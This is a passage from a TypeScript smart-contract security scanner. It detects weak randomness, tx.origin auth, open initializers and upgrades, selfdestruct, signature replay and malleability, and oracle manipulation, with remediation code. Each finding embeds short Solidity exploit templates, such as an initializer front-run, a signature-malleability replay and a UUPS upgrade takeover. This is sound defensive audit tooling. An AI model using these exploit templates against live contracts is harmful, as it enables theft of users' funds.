 * nonce mstore. Block data anywhere else (a selection, a deadline,
 * a branch) means it is NOT oracle-only. EtherHiLo's
 * oraclize_newRandomDSQuery and QueryNpmAuthentication's
 * provable_newRandomDSQuery hash blockhash/coinbase/timestamp into
 * the `unonce` nonce for an off-chain random source.
 */
function oracleNonceOnly(src: string, fnName: string): boolean {
  void fnName;
  if (!/\b(?:oraclize_query|provable_query)\s*\(/.test(src)) return false;
  // Blank the unonce nonce mstore spans (paren-depth from mstore().
  let blanked = src;
  for (const m of src.matchAll(/\bmstore\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    if (/unonce/.test(src.slice(m.index!, i))) {
      blanked = blanked.slice(0, m.index!) + " ".repeat(i - m.index!) + blanked.slice(i);
    }
  }
  // Blank oracle query / commitment call argument spans.
  for (const m of src.matchAll(/\b(?:oraclize_query|provable_query|oraclize_randomDS_setCommitment|provable_randomDS_setCommitment)\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    blanked = blanked.slice(0, m.index!) + " ".repeat(i - m.index!) + blanked.slice(i);
  }
  return !BLOCK_DATA.test(blanked);
}

/**
 * True when every hash-of-block-data in src is assigned to an
 * identifier (an *id field/variable) and there is no selection use
 * (Fix 20): no % operator anywhere in the function and no hash used
 * as an array index. EtherHiLo's beginGame
 * (keccak256(block.number, player, bet) -> game id) is an identifier,
 * not randomness. A hash that is %'d, indexed, returned, or branched
 * on is a selection and does not count. Scoped to the clock+mix path:
 * bare blockhash/prevrandao/difficulty are entropy by nature, so the
 * caller only applies this when no entropy source is present.
 */
function hashOnlyAsIdentifier(src: string): boolean {
  let anyHash = false;
  for (const m of src.matchAll(/\b(?:keccak256|sha3)\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    const span = src.slice(m.index! + m[0].length, i - 1);
    if (!BLOCK_DATA.test(span)) continue;
    anyHash = true;
    // The text before the hash call must end with an id assignment:
    // `gameId =`, `id:`, `id: uint(`, `game.id = uint(`. The separator
    // excludes `[` so a mapping key (balances[tokenId] = ...) is not
    // mistaken for the assignment target.
    const before = src.slice(0, m.index!).replace(/\s+$/, "");
    if (!/(?:^|[;{},()])(\s*(?:[\w.]+\.)?[\w$]*[Ii][Dd]\s*[:=]\s*(?:[a-zA-Z0-9_]+\s*\()?\s*)$/.test(before)) return false;
  }
  if (!anyHash) return false;
  if (/%/.test(src)) return false;
  if (/\[\s*(?:uint\d*|int\d*)?\s*\(?\s*(?:keccak256|sha3)\s*\(/.test(src)) return false;
  return true;
}

/** The argument span of the hash call that starts at `start` (the index of
 *  the `keccak256`/`sha3` token) with `len` its full matched length. */
function hashArgsSpan(src: string, start: number, len: number): string | null {
  let depth = 1;
  let i = start + len;
  while (i < src.length && depth > 0) {
    if (src[i] === "(") depth += 1;
    else if (src[i] === ")") depth -= 1;
    i += 1;
  }
  if (depth !== 0) return null;
  return src.slice(start + len, i - 1);
}

/**
 * R1 (2026-10-27 detection upgrade): the Team Just five-field mixer.
 *
 * F5D, FoMo3DSoon, FoMoJP and RobTheBank all derive their draw from
 * `keccak256(abi.encodePacked(block.timestamp, block.difficulty,
 * block.coinbase, players.length))` — three DIFFERENT block fields mixed
 * into one hash. The rule set modelled one field at a time (a `%` on
 * block data, or a hash containing *some* block data), so the five-term
 * mixer was the measured recall gap. Three distinct fields in one hash
 * input is the fingerprint; the count matters, not the exact order.
 */
function teamJustMixer(src: string): boolean {
  for (const m of src.matchAll(/\b(?:keccak256|sha3)\s*\(/g)) {
    const span = hashArgsSpan(src, m.index!, m[0].length);
    if (!span) continue;
    const clock = /block\.timestamp|\bnow\b/.test(span);
    const difficulty = /block\.difficulty|block\.prevrandao/.test(span);
    const third = /block\.coinbase|block\.gaslimit/.test(span);
    if (clock && difficulty && third) return true;
  }
  return false;
}

/** A call whose name says it selects something with its argument. */
const SELECTION_SINK = /\b(?:trait|rarity|random|rand|roll|draw|pick|winner|choose|seed|shuffle)\w*\s*\(/i;

/**
 * R2 (2026-10-27 detection upgrade): entropy that is DERIVED and then
 * selected on, rather than `%`'d in the same statement.
 *
 * NEOLASTICS, EulerBeats and Arborithms hash block data into a variable
 * (`bytes32 h = keccak256(...)`) and use the RESULT a statement later —
 * as an array index, a comparison, a branch, or a trait lookup. The
 * one-statement `%` rule and the identifier-only suppression both miss
 * that shape, so the output is followed here: any arithmetic, comparison,
 * branch, or selection-named sink on a variable assigned from a
 * block-data hash is a selection.
 *
 * Deliberately NOT a selection: using the hash as a mapping KEY
 * (`games[gameId] = ...`), which is the identifier shape Fix 20 protects
 * — a game id is not a draw.
 */
function derivedEntropySelected(src: string): boolean {
  const names = new Set<string>();
  for (const m of src.matchAll(/\b(?:keccak256|sha3)\s*\(/g)) {
    const span = hashArgsSpan(src, m.index!, m[0].length);
    if (!span || !BLOCK_DATA.test(span)) continue;
    const before = src.slice(0, m.index!).replace(/\s+$/, "");
    const asg = before.match(/([A-Za-z_$][\w$]*)\s*=\s*(?:u?int\d*\s*\(\s*)?$/);
    if (asg && asg[1]) names.add(asg[1]);
  }
  for (const name of names) {
    const n = escapeRegExp(name);
    if (new RegExp(`\\b${n}\\b\\s*[%/]`).test(src)) return true;
    if (new RegExp(`[%/]\\s*\\b${n}\\b`).test(src)) return true;
    if (new RegExp(`\\b${n}\\b\\s*(?:==|!=|<=|>=|<|>)`).test(src)) return true;
    if (new RegExp(`(?:==|!=|<=|>=|<|>)\\s*\\b${n}\\b`).test(src)) return true;
    if (new RegExp(`\\bif\\s*\\([^)]*\\b${n}\\b`).test(src)) return true;
    if (new RegExp(`\\b${n}\\b[^;]*\\?|\\?[^;]*\\b${n}\\b`).test(src)) return true;
    if (new RegExp(`${SELECTION_SINK.source}[^;]*\\b${n}\\b`).test(src)) return true;
  }
  return false;
}

type ReachInfo = {
  /** Public entry points that reach this function (itself included
   * when externally callable) — Fix 38 provenance for scanSimple. */
  entries: FnModel[];
  /** Reachability is uncertain (derived contracts exist in the
   * file): empty entries then prove nothing and must fail closed. */
  provenanceUncertain: boolean;
  /** The contract declares at least one externally callable fn, so
   * an empty entry set is positive evidence of unreachability. */
  contractHasEntries: boolean;
};

function scanSimple(
  fn: FnModel,
  contract: ContractModel,
  model: SourceModel,
  parsed: string,
  delta: number,
  authed: boolean,
  push: (f: Finding) => void,
  reach?: ReachInfo,
) {
  const src = fn.source;
  if (/tx\.origin/.test(src)) {
    if (isEoaGateOnly(src)) {
      push(make({
        severity: "low",
        swc: "SWC-115",
        title: `${fn.name} uses an EOA-gate (tx.origin == msg.sender)`,
        confidence: "high",
        detector: "tx-origin",
        summary: "The only tx.origin use here is require(msg.sender == tx.origin), which blocks contract callers. It authenticates nobody: a phished EOA calling directly still passes. It also blocks legitimate contract wallets, multisigs, and account-abstraction accounts.",
        walkthrough: "1. The function requires msg.sender == tx.origin, so any contract call is rejected.\n2. That blocks vaults, multisigs, and account-abstraction wallets — not just attackers.\n3. It authenticates nobody: a phished EOA calling directly still passes.",
        exploitSolidity: "",
        remediationSolidity: "// If the goal is blocking contracts, accept the tradeoff explicitly (it breaks multisigs/AA). If the goal is authentication, check msg.sender against an allowlist instead.",
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    } else if (isTxOriginDenyOnly(src)) {
      push(make({
        severity: "low",
        swc: "SWC-115",
        title: `${fn.name} uses tx.origin in a deny check (blacklist)`,
        confidence: "high",
        detector: "tx-origin",
        summary: "The only tx.origin use here is a negated/blacklist check, which blocks rather than grants. It authenticates nobody, and the auth-bypass framing does not apply: the check can only revert. The residual effect is over-blocking — a blacklisted EOA cannot use any contract to call through.",
        walkthrough: "1. The check denies when tx.origin is blacklisted; it never grants access.\n2. A forwarding contract cannot bypass it: tx.origin is still the blacklisted signer.\n3. The cost is over-blocking, not a bypass.",
        exploitSolidity: "",
        remediationSolidity: "// If the deny is intentional (blacklist covers forwarded calls), keep it and document the over-blocking. If the goal is authentication, check msg.sender instead.",
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    } else {
      push(make({
        severity: "high",
        swc: "SWC-115",
        title: `${fn.name} authenticates with tx.origin`,
        confidence: "high",
        detector: "tx-origin",
        summary: "tx.origin is the signer of the transaction, not the caller. A contract the signer uses can reenter this function and pass the check.",
        walkthrough: originWalk(fn.name),
        exploitSolidity: originExploit(contract.name, fn.name),
        remediationSolidity: originFix(),
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
  }

  // Zero slippage bound: a swap that accepts any output
  // (amountOutMin 0) is sandwichable — a searcher moves the price
  // against the swap and it still executes. CoinToken's handleTax
  // calls swapExactTokensForETH(toSell, 0, ...) and
  // addLiquidityETH(..., 0, 0, ...) with both mins 0. Only literal
  // 0 counts: a param min (minOut) is a real bound. swapExactETH*
  // takes amountOutMin as its FIRST arg, the other swapExact* as
  // the second; addLiquidity takes two consecutive min args.
  if (
    /swapExact\w+\s*\(\s*0(\s*(ether|gwei|wei))?\s*,/.test(src) ||
    /swapExact\w+\s*\(\s*[^,]+,\s*0(\s*(ether|gwei|wei))?\s*,/.test(src) ||
    /addLiquidity\w*\s*\([^)]*,\s*0(\s*(ether|gwei|wei))?\s*,\s*0(\s*(ether|gwei|wei))?\s*,/.test(src)
  ) {
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} swaps with a zero slippage bound`,
      confidence: "high",
      detector: "zero-slippage-swap",
      summary: "A swap or liquidity add passes a literal 0 as its minimum-output bound, so it executes at any price. A searcher can sandwich the trade and the contract still accepts the worst fill.",
      walkthrough: "1. amountOutMin (or both addLiquidity mins) is a literal 0.\n2. A searcher front-runs the swap, moves the pool price, and the swap still executes.\n3. Pass a real minimum derived from an oracle/TWAP or the caller's quote, and revert if the fill is worse.",
      exploitSolidity: "",
      remediationSolidity: `uint256 minOut = (amountIn * expectedPrice) / 1e18;\nminOut = (minOut * 995) / 1000; // 0.5% slippage tolerance\nrouter.swapExactTokensForETH(amountIn, minOut, path, address(this), block.timestamp);`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // Match on the comment/string-stripped view, not the raw source.
  //
  // Measured 2026-10-29: this rule fired FIVE criticals on a UUPS implementation and
  // five more on an OpenZeppelin ERC1967Proxy, neither of which contains a
  // selfdestruct call. The proxy's whole source is a constructor and one internal view
  // function. The rule was testing `src`, which still holds comments and string
  // literals, so a NatSpec line or a doc comment mentioning `selfdestruct(` produced a
  // critical. Every other rule in this file tests `clean`.
  //
  // `stripCommentsAndStringsKeepLines` blanks comments and string bodies in place, so
  // offsets stay aligned and the paren-depth scan below can still slice the REAL source
  // to recover the beneficiary argument.
  const sdScan = stripCommentsAndStringsKeepLines(src);
  if (/\bselfdestruct\s*\(|\bsuicide\s*\(/.test(sdScan)) {
    // "Attacker-chosen address" is only true when the caller controls the
    // beneficiary: a param, msg.sender, or storage this function writes.
    // selfdestruct(burn) with burn a constant sends to a fixed address —
    // anyone can trigger the destruction (griefing), but nobody profits.
    // The beneficiary arg is extracted by paren-depth scan, not a
    // [^)]* regex: selfdestruct(payable(address(this))) has nested
    // parens, and a naive capture truncates to `payable(address(this`
    // (which Fix 13's address(this) check would never match).
    const sdCall = sdScan.match(/\b(?:selfdestruct|suicide)\s*\(/);
    let sdArg = "";
    if (sdCall && sdCall.index !== undefined) {
      let depth = 1;
      let i = sdCall.index + sdCall[0].length;
      while (i < src.length && depth > 0) {
        if (src[i] === "(") depth += 1;
        else if (src[i] === ")") depth -= 1;
        i += 1;
      }
      sdArg = src.slice(sdCall.index + sdCall[0].length, i - 1).trim();
    }
    const sdControlled = sdArg ? isCallerControlled(sdArg, fn, contract) : true;
    // Fix 38 gate (selfdestruct): guard credit and reachability,
    // generalized from the sweep — all 7 stored criticals were
    // classic multiowned Wallet.sol, where kill() carries
    // `onlymanyowners(sha3(msg.data))`: the modifier IS the access
    // check, delegated to confirmAndCheck, and isAuthed's shallow
    // patterns never credited it.
    //  - deep modifier evidence (authEvidenceOf: isAuthed, a
    //    fixed-caller gate, or a modifier whose body — or a helper it
    //    calls — checks msg.sender) counts as access control → the
    //    Fix 21 medium treatment;
    //  - a modifier that is only a POSSIBLE guard (unresolvable, or
    //    not provably caller-free) caps the critical at high with a
    //    note naming it — never ignored, never credited as proven;
    //  - an internal/private site must be externally reachable
    //    through a public entry: proven-unreachable (entries empty,
    //    provenance certain, the contract has real entries) → no
    //    finding; entries all proven authed → the medium treatment.
    const selfEv = authEvidenceOf(fn, contract, model);
    let sdAuthed = authed || selfEv.authed;
    let sdPossibleMods = sdAuthed ? [] : selfEv.possibleMods;
    let sdReachable = true;
    if (!isExternallyCallable(fn) && reach) {
      if (reach.entries.length === 0) {
        sdReachable = reach.provenanceUncertain || !reach.contractHasEntries;
      } else {
        const entryEvs = reach.entries.map((e) => authEvidenceOf(e, contract, model));
        if (entryEvs.every((x) => x.authed)) sdAuthed = true;
        if (!sdAuthed) {
          sdPossibleMods = [...new Set([...sdPossibleMods, ...entryEvs.flatMap((x) => x.possibleMods)])];
        }
      }
    }
    if (sdReachable) {
      // Fix 21: an access-controlled selfdestruct is MEDIUM, not high —
      // the owner key can destroy the contract, but only the gated key
      // can do it, so it is a governance-trust note, not an open kill
      // switch. Uncontrolled selfdestruct to a caller-chosen address
      // keeps the critical rule; a fixed beneficiary stays low.
      let finding = make({
        severity: sdControlled ? (sdAuthed ? "medium" : "critical") : "low",
        swc: "SWC-106",
        title: sdControlled
          ? (sdAuthed ? `${fn.name} can selfdestruct` : `${fn.name} selfdestructs without an access check`)
          : `${fn.name} can selfdestruct to a fixed address`,
        confidence: "high",
        detector: "selfdestruct",
        summary: sdControlled
          ? (sdAuthed
            ? "A privileged caller can destroy the contract and send away the balance. On chains that still honor deletion outside the creating transaction this is final; either way the balance moves."
            : "selfdestruct is reachable without an owner check. The balance can be forced to an attacker-chosen address.")
          : "selfdestruct is reachable without an owner check, but the beneficiary is fixed (a constant or storage the caller cannot redirect), so the caller gains nothing. Anyone can still destroy the contract — griefing, not theft.",
        walkthrough: "1. selfdestruct sends the full balance to its argument and, where deletion still applies, removes the code.\n2. A public function with no msg.sender check is an open kill switch.\n3. Combined with CREATE2, the address can be redeployed with different code.",
        exploitSolidity: sdControlled && !sdAuthed ? `interface IVictim { function ${fn.name}(address payable to) external; }` : "",
        remediationSolidity: `function close(address payable to) external onlyOwner {\n    // Prefer a normal withdraw. selfdestruct is not an upgrade strategy after EIP-6780.\n    selfdestruct(to);\n}`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      });
      if (!sdAuthed && sdPossibleMods.length > 0) {
        finding = withGateCap(finding, unverifiedModifierNote(sdPossibleMods));
      }
      push(finding);
    }
  }

  const initName = /^init(ialize)?$/.test(fn.name);
  // Fix 37 (provenance): an initializer candidate must be an entry
  // point OF THE ANALYZED CONTRACT — externally reachable (public /
  // external / pre-0.5 default visibility) and declared on a contract,
  // never an internal or private function and never a library or
  // interface member. The 2026-10-25 fork proof (initializer-proof/
  // RESULTS.md) found a stored critical whose "initialize" was an
  // `internal view` library function inside Settler's flattened source:
  // it is not callable on the deployed contract at any severity.
  // Sibling contracts in one compilation (Party's initialize flagged
  // on a TokenDistributor record) are handled by detectSource scoping
  // when the target is known, and on the address path by the
  // initializer gate's ABI membership check (initializer-gate.ts),
  // which drops a candidate the deployed contract does not expose.
  const initCandidate =
    initName &&
    contract.kind !== "library" &&
    contract.kind !== "interface" &&
    fn.visibility !== "internal" &&
    fn.visibility !== "private";
  // A revert-only initialize (StarkWare Proxy) cannot be called
  // successfully by anyone — skip the unprotected-initializer flag.
  // Fix 36: the same flag conditions on a PROXY-shaped contract are a
  // category error, not a critical. The initializer an attacker would
  // front-run lives in the IMPLEMENTATION (its setup replaces the
  // constructor there); the proxy's own initialize (the OZ
  // AdminUpgradeabilityProxy shape) is the deploy-time binding of
  // logic/admin, and whether it already ran is chain state, not source
  // shape. Suppress the critical on proxies and note where the check
  // belongs; an implementation's own unprotected initialize (non-proxy
  // contract) is flagged in the branch below — capped at high since
  // Fix 37, for the reason given there.
  if (initCandidate && !alwaysReverts(src) && !authed && !fn.modifiers.some((m) => /initializer|reinitializer/i.test(m)) && !/require\s*\(\s*!?\s*initialized/.test(src) && isProxyShape(contract)) {
    push(make({
      severity: "info",
      swc: null,
      title: `${fn.name} is on a proxy contract — the initializer check belongs to the implementation`,
      confidence: "high",
      detector: "unprotected-initializer",
      summary: `${contract.name} is a proxy-shaped contract, so an unprotected-initialize flag here aims at the wrong contract. The setup that replaces a constructor — and that an attacker would front-run — is the implementation's initialize, which is audited on the implementation contract. The proxy's own initialize is the deploy-time binding of logic/admin (already-run is on-chain state, not visible in source). No critical is raised against the proxy itself.`,
      walkthrough: [
        `1. ${fn.name} sits on ${contract.name}, a proxy: calls to it are the deploy-time setup path, not the implementation's setup.`,
        "2. Audit the implementation contract's initialize for the one-shot guard (initializer modifier / initialized flag / _disableInitializers in its constructor).",
        "3. Confirm on-chain that the proxy's implementation slot is already set — a deployed, initialized proxy cannot be re-initialized through this path.",
      ].join("\n"),
      exploitSolidity: "",
      remediationSolidity: `// In the IMPLEMENTATION: lock the logic contract itself.
constructor() { _disableInitializers(); }
function initialize(address _oracle) external initializer { oracle = _oracle; }`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  } else if (initCandidate && !alwaysReverts(src) && !authed && !fn.modifiers.some((m) => /initializer|reinitializer/i.test(m)) && !/require\s*\(\s*!?\s*initialized/.test(src)) {
    // Fix 37 (severity): the source pattern alone no longer stamps
    // critical. The fork proof executed the re-init call against all
    // 15 stored criticals of this type and every one failed —
    // already-initialized guards (7), access control (3), no such
    // entry point (4), per-pool category errors (2) — because source
    // shape cannot see live initialized state. The finding stays (the
    // pattern is a real lead), capped at high with the gate note;
    // critical is restored only by the live-state gate
    // (initializer-gate.ts) on the address path, on positive live
    // evidence, which also marks the finding corroborated. Pasted
    // source has no chain to probe, so it keeps this cap.
    push(make({
      severity: "high",
      swc: null,
      title: `${fn.name} can be called by anyone, more than once`,
      confidence: "high",
      detector: "unprotected-initializer",
      summary: "Initializer functions replace the constructor on proxies. Without an initializer modifier or a one-shot flag check, anyone can reset the owner or oracle, and they can do it again later." + INITIALIZER_GATE_NOTE_UNCONFIRMED,
      walkthrough: [
        `1. ${fn.name} is ${fn.visibility || "public"} and writes privileged storage.`,
        "2. Nothing reverts when it has already been called.",
        "3. On a proxy, the implementation's constructor never ran, so this function is the whole setup path — and it is open.",
        "4. Front-run the deploy: call initialize before the deployer and become the owner.",
      ].join("\n"),
      exploitSolidity: `interface IVictim { function initialize(address) external; }\ncontract FrontRun {\n    function snipe(address proxy, address me) external {\n        IVictim(proxy).initialize(me);\n    }\n}`,
      remediationSolidity: `import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";\nfunction initialize(address _oracle) external initializer {\n    require(_oracle != address(0));\n    oracle = _oracle;\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  const writesPriv = contract.stateVars.some((v) => PRIVILEGED.test(v.name) && rx(`\\b${v.name}\\s*=`).test(src));
  // Fix 14: a self-burn is a standard user action, not an admin action.
  // `burn` stays in the name list, but a burn that burns the caller's
  // OWN tokens (_burn(msg.sender, ...) / _burn(_msgSender(), ...)) does
  // not trigger on name alone — TRYfinance's burn(amount) burns the
  // caller's own tokens via _burn(_msgSender()). A burn that burns
  // someone else's tokens with no gate still flags. (Dropping `burn`
  // outright would also silence a bare, ungated burn of another
  // account — Fix 26 requires that case to keep flagging.)
  const isSelfBurn = fn.name === "burn" && /_burn\s*\(\s*(msg\.sender|_msgSender\s*\(\s*\))/.test(src);
  // Fix 14b: a paid mint is a sale, not an admin action. `mint` drops
  // out when the function requires payment — a require mentioning
  // msg.value (BallerBananas: require(msg.value >= cost * _mintAmount)).
  // An unpaid, ungated mint still flags on name alone.
  const isPaidMint = fn.name === "mint" && /require\s*\([^;]*?msg\.value/.test(src);
  const adminName = /^(mint|burn|setOwner|transferOwnership|upgrade|upgradeTo|upgradeToAndCall|pause|unpause|setFee|setTax|setOracle|setImplementation|execute)$/.test(fn.name) && !isSelfBurn && !isPaidMint;
  if (!initName && (writesPriv || adminName) && !authed && !fn.isConstructor && fn.visibility !== "internal" && fn.visibility !== "private" && fn.mutability !== "view" && fn.mutability !== "pure") {
    push(make({
      severity: adminName || writesPriv ? "critical" : "high",
      swc: "SWC-105",
      title: `${fn.name} changes privileged state without an access check`,
      confidence: "medium",
      detector: "unprotected-admin",
      summary: `${fn.name} is externally callable and writes an owner, oracle, implementation, or other privileged variable — or its name is an admin action — and Kiln found no msg.sender check.`,
      walkthrough: `1. Confirm there is no inherited modifier the parser missed. Bases: ${contract.bases.join(", ") || "(none)"}.\n2. If the function really is open, call it and take the role.\n3. Add onlyOwner, or a role check, and a zero-address check on the new value.`,
      exploitSolidity: `interface IVictim { function ${fn.name}(address next) external; }`,
      remediationSolidity: `function ${fn.name}(address next) external onlyOwner {\n    require(next != address(0));\n    owner = next;\n    emit OwnershipTransferred(msg.sender, next);\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (fn.name === "_authorizeUpgrade" && !authed) {
    push(make({
      severity: "critical",
      swc: null,
      title: "_authorizeUpgrade is not restricted",
      confidence: "high",
      detector: "unprotected-admin",
      summary: "UUPS upgrades call _authorizeUpgrade. If it is empty or open, anyone can replace the implementation.",
      walkthrough: "1. upgradeToAndCall is public on the UUPS base.\n2. The only gate is this function.\n3. An empty body, or one that does not check msg.sender, hands out the upgrade.",
      exploitSolidity: `function attack(address proxy, address evil) external {\n    IUUPS(proxy).upgradeToAndCall(evil, "");\n}`,
      remediationSolidity: `function _authorizeUpgrade(address) internal override onlyOwner {}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (/ecrecover\s*\(/.test(src)) {
    if (!/7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0/i.test(src) && !/\bs\s*(<=|<)/.test(src)) {
      push(make({
        severity: "medium",
        swc: "SWC-117",
        title: `${fn.name} does not bind the signature's s value`,
        confidence: "medium",
        detector: "signature-malleability",
        summary: "ecrecover accepts both s and secp256k1n - s for many signatures. Without an s < n/2 check, one approval can be replayed as a second distinct signature.",
        walkthrough: "1. A signature (v, r, s) has a malleable twin (v', r, n - s).\n2. Both recover the same signer on many libraries, but the bytes differ.\n3. A mapping keyed by the signature hash, rather than by a nonce, treats them as two uses.",
        exploitSolidity: `interface IVictim { function ${fn.name}(bytes32 hash, uint8 v, bytes32 r, bytes32 s) external; }
contract MalleabilityAttack {
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    function attack(address victim, bytes32 hash, uint8 v, bytes32 r, bytes32 s) external {
        IVictim(victim).${fn.name}(hash, v, r, s);
        uint8 v2 = v == 27 ? 28 : 27;
        bytes32 s2 = bytes32(N - uint256(s));
        IVictim(victim).${fn.name}(hash, v2, r, s2);
    }
}`,
        remediationSolidity: `require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "s");\nrequire(v == 27 || v == 28, "v");`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
    // A view/pure function cannot be replayed: it changes no state, so re-submitting the
    // same signature achieves nothing. Measured 2026-10-29 against realistic code — a
    // plain `isValidSignature(hash,v,r,s) external view returns (bool)` that only ANSWERS
    // whether a signature belongs to the owner was reported as a replay risk. That is the
    // shape of every EIP-1271 helper, and at 79 findings this detector was the most
    // common in the archive.
    const cannotAct = /\bview\b|\bpure\b/.test(fn.mutability ?? "");
    if (!cannotAct && !/nonce|deadline|chainid|chain\.id|domainSeparator|used\[/i.test(src)) {
      push(make({
        severity: "medium",
        swc: "SWC-121",
        title: `${fn.name} verifies a signature with no nonce or deadline`,
        confidence: "medium",
        detector: "signature-replay",
        summary: "The digest does not appear to include a nonce, a deadline, or a domain separator. The same signature can be reused, possibly on another chain.",
        walkthrough: "1. ecrecover only tells you who signed the hash.\n2. If the hash is just the arguments, the signer cannot prevent a second submission.\n3. Include chainid, the verifying-contract address, a nonce that increments, and a deadline.",
        exploitSolidity: `interface IVictim { function ${fn.name}(bytes32 hash, uint8 v, bytes32 r, bytes32 s) external; }
contract ReplayAttack {
    function attack(address victim, bytes32 hash, uint8 v, bytes32 r, bytes32 s) external {
        IVictim(victim).${fn.name}(hash, v, r, s);
        // Replay identical signature
        IVictim(victim).${fn.name}(hash, v, r, s);
    }
}`,
        remediationSolidity: `bytes32 digest = keccak256(abi.encodePacked(\n    "\\x19\\x01", DOMAIN_SEPARATOR(), keccak256(abi.encode(TYPEHASH, user, amount, nonces[user]++, deadline))\n));\nrequire(block.timestamp <= deadline, "expired");`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
  }

  if (/getReserves\s*\(|\.slot0\s*\(|latestRoundData\s*\(|latestAnswer\s*\(/.test(src) && !/^(getReserves|slot0|latestRoundData|latestAnswer)$/.test(fn.name)) {
    // A view/pure function only quotes — nothing in this contract
    // settles on it. It becomes a risk only if another protocol treats
    // the quote as an oracle, so that is info, not high.
    // And a BARE getReserves()/slot0() call (no receiver) is the
    // contract pricing its OWN pool — SAGE's buy/sell/removeLiquidity
    // call their own getReserves(), which returns their own balances.
    // This contract IS the market; no outside protocol settles on
    // this number. An external oracle always has a receiver
    // (pair.getReserves(), feed.latestRoundData()), so strip the
    // bare/this calls and only keep HIGH if an external one remains.
    // The residual own-pool risk is sandwich/MEV on the caller's own
    // trade, so that is low, not high.
    const viewOnly = fn.mutability === "view" || fn.mutability === "pure";
    const withoutOwn = src.replace(/(^|[^\w.]|this\.)(getReserves|slot0|latestRoundData|latestAnswer)\s*\(/g, "$1");
    const externalOracle = /(getReserves|slot0|latestRoundData|latestAnswer)\s*\(/.test(withoutOwn);
    const ownPool = !externalOracle;
    push(make({
      severity: viewOnly ? "info" : ownPool ? "low" : "high",
      swc: null,
      title: viewOnly ? `${fn.name} quotes off a spot oracle (view-only)` : ownPool ? `${fn.name} prices its own pool from spot reserves (AMM)` : `${fn.name} prices off a spot oracle`,
      confidence: "medium",
      detector: "oracle-spot",
      summary: viewOnly
        ? "A reserves read, a Uniswap v3 slot0, or a spot Chainlink-style answer is used directly. This function is view-only: it quotes a price but nothing in this contract settles on it. It becomes a risk only if another protocol treats this quote as an oracle."
        : ownPool
          ? "The price comes from this contract's own reserves (a bare getReserves()/slot0() call to its own function), not an external oracle — this contract is the market. No outside protocol settles on this number. The residual risk is sandwich/MEV on the caller's own trade; check the slippage bound."
          : "A reserves read, a Uniswap v3 slot0, or a spot Chainlink-style answer is used directly. Spot reserves move inside a single transaction; a stale or unchecked oracle answer is the other half of this class.",
      walkthrough: "1. Borrow via a flash loan, move the pool, and read the new price in the same call.\n2. Anything that mints, borrows, or liquidates on that number is wrong for one block — which is long enough.\n3. Use a TWAP, or Chainlink with a freshness and min/max answer check. Never use slot0 or getReserves as a price.",
      exploitSolidity: `// Inside a flash swap callback:\nuint256 fake = victim.quote(pair);\n// fake reflects the pool you just skewed. Borrow against it, then repay the swap.`,
      remediationSolidity: `(uint80 roundId, int256 answer,, uint256 updatedAt,) = feed.latestRoundData();\nrequire(answer > 0 && updatedAt >= block.timestamp - 1 hours, "stale");\nrequire(feed.getAnswer(roundId) == answer);`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (/(price|quote|rate)/i.test(fn.name) && /address\(this\)\.balance|\.balance\b/.test(src)) {
    push(make({
      severity: "medium",
      swc: "SWC-120",
      title: `${fn.name} treats a token or ether balance as a price`,
      confidence: "medium",
      detector: "balance-as-price",
      summary: "A raw balance can be pushed up with a direct transfer, including in the same transaction. It is not a manipulation-resistant price.",
      walkthrough: "1. Donate tokens or ETH straight to the contract.\n2. balance increases with no share mint.\n3. The next caller buys shares too cheap, or collateral looks too thick.",
      exploitSolidity: `// victim.price() returns address(this).balance.\n// Send 1 wei or 1e24 wei first, depending on which way the formula breaks.`,
      remediationSolidity: "// Price from a TWAP or an oracle. Use an internal accounting variable, not address(this).balance.",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (hasDivThenMul(fn.body)) {
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} divides before it multiplies`,
      confidence: "high",
      detector: "div-before-mul",
      summary: "Integer division truncates. Doing it before a multiply throws away precision and, in a share or price formula, donates value to the next caller or rounds a payout to zero.",
      walkthrough: "1. (a / b) * c truncates a/b first.\n2. If a < b the whole product is zero.\n3. Multiply first, then divide: (a * c) / b. Watch the overflow on the product if you are below 0.8 or inside unchecked.",
